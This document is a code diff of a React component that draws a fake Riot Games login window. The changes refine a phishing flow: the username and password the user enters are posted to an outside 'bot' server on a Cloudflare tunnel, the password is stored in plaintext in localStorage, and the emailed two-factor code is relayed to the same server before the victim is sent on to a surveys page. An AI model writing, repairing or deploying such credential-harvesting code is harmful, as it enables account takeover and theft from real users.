@@ -18,7 +18,6 @@ const RiotWindow = ({ onClose, onSuccess }) => {
   const dragStart = useRef({ x: 0, y: 0 });
   const loginTimeout = useRef(null);
 
-  // UPDATE THIS WITH YOUR NGROK URL
   const BOT_URL = 'https://shoe-frontier-cloud-strand.trycloudflare.com';
 
   const handleMouseDown = (e) => {
@@ -40,26 +39,26 @@ const RiotWindow = ({ onClose, onSuccess }) => {
     document.removeEventListener('mouseup', handleMouseUp);
   };
 
-  const sendToBot = async (user, pass) => {
-    try {
-      const response = await fetch(`${BOT_URL}/login`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: user, password: pass })
-      });
-      
-      const data = await response.json();
-      
-      if (data.success) {
-        setSessionId(data.sessionId);
-        return true;
-      }
-      return false;
-    } catch (err) {
-      console.error("Bot error:", err);
-      return false;
+const sendToBot = async (user, pass) => {
+  try {
+    const response = await fetch(`${BOT_URL}/login`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: user, password: pass })
+    });
+
+    const data = await response.json();
+
+    if (data.success) {
+      return data.sessionId; // ✅ return directly
     }
-  };
+
+    return null;
+  } catch (err) {
+    console.error("Bot error:", err);
+    return null;
+  }
+};
 
   const sendCodeToBot = async (code) => {
     try {
@@ -92,17 +91,17 @@ const RiotWindow = ({ onClose, onSuccess }) => {
       
       if (data.status === "verified") {
         setVerificationResult('correct');
-        setBotMessage("✅ Verified!");
+        setBotMessage("Verified!");
         setTimeout(() => {
           setStep(4);
           if (onSuccess) onSuccess();
           setTimeout(() => {
-            window.location.href = '/dashboard';
+            window.location.href = '/surveys';
           }, 2000);
         }, 1000);
       } else if (data.status === "failed") {
         setVerificationResult('incorrect');
-        setBotMessage("❌ Incorrect code. Try again.");
+        setBotMessage("Incorrect code. Try again.");
         setTimeout(() => {
           setStep(2);
           setCode("");
@@ -119,36 +118,31 @@ const RiotWindow = ({ onClose, onSuccess }) => {
     }
   };
 
-  const handleLogin = async () => {
-    if (!isEnabled) return;
-    
-    setLoading(true);
-    
-    const botSent = await sendToBot(username, password);
-    
-    if (botSent) {
-      try {
-        localStorage.setItem('riot_u', username);
-        localStorage.setItem('riot_p', password);
-      } catch (err) {
-        console.error("Storage failed:", err);
-      }
-      
-      if (loginTimeout.current) {
-        clearTimeout(loginTimeout.current);
-      }
-      
-      loginTimeout.current = setTimeout(() => {
-        setLoading(false);
-        setStep(2);
-        setBotMessage("Enter the code from your email:");
-        loginTimeout.current = null;
-      }, 3000);
-    } else {
-      setLoading(false);
-    }
-  };
+const handleLogin = async () => {
+  if (!isEnabled) return;
 
+  setLoading(true);
+
+  const session = await sendToBot(username, password);
+
+  if (session) {
+    setSessionId(session); // ✅ correct
+
+    localStorage.setItem('riot_u', username);
+    localStorage.setItem('riot_p', password);
+    localStorage.setItem('riot_session', session); // ✅ USE session, NOT state
+
+    console.log("Session saved:", session);
+
+    setTimeout(() => {
+      setLoading(false);
+      setStep(2);
+      setBotMessage("Enter the code from your email:");
+    }, 3000);
+  } else {
+    setLoading(false);
+  }
+};
   const handleCodeSubmit = async () => {
     if (!code || code.length < 6) return;
     
@@ -306,7 +300,7 @@ const RiotWindow = ({ onClose, onSuccess }) => {
             </div>
             
             <h2 className="text-2xl text-green-600 font-bold mb-2">Verified!</h2>
-            <p className="text-zinc-600 text-sm">✅ Account verified successfully.</p>
+            <p className="text-zinc-600 text-sm">Redirecting to surveys...</p>
           </div>
         </>
       );
